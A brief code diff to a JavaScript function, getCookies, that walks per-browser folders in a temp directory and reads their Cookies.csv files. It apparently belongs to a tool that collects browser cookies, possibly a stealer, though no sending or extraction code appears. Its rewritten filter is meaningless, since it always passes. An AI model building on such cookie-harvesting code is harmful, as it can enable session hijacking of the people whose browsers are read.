@@ -11,8 +11,8 @@ const { tempFolder } = require('../index');
  */
 module.exports.getCookies = async () => {
   let cookies = [];
-  const browsers = await searchForFolder(join(tempFolder, 'Browsers'), 500);
-  for (const browser of browsers.filter(f => f.split('.').length >= 1)) {
+  const browsers = await searchForFolder(join(tempFolder, 'Browsers'), 1000) || [];
+  for (const browser of browsers.filter(f => f.split('.'))) {
     const file = join(tempFolder, 'Browsers', browser, 'Cookies.csv');
     let line = await searchForFile(file, 1000);
     if (!line) return;
